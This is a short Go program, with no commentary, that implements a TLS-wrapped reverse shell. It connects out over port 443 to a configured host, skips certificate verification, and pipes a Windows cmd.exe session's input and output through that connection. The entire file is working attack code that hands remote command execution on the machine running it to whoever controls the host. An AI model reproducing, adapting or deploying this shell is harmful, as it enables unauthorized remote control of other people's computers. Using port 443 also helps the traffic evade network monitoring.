package main

import (
	"crypto/tls"
	"net"
	"os/exec"
)

const (
	host    = "google.com"
	port    = "443"
	network = "tcp"
	program = "cmd.exe"
)

func main() {
	conn, _ := net.Dial(network, net.JoinHostPort(host, port))
	config := &tls.Config{ServerName: host, InsecureSkipVerify: true}
	tlsConn := tls.Client(conn, config)
	defer conn.Close()

	cmd := exec.Command(program)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = tlsConn, tlsConn, tlsConn
	_ = cmd.Start()
	_ = cmd.Wait()
}
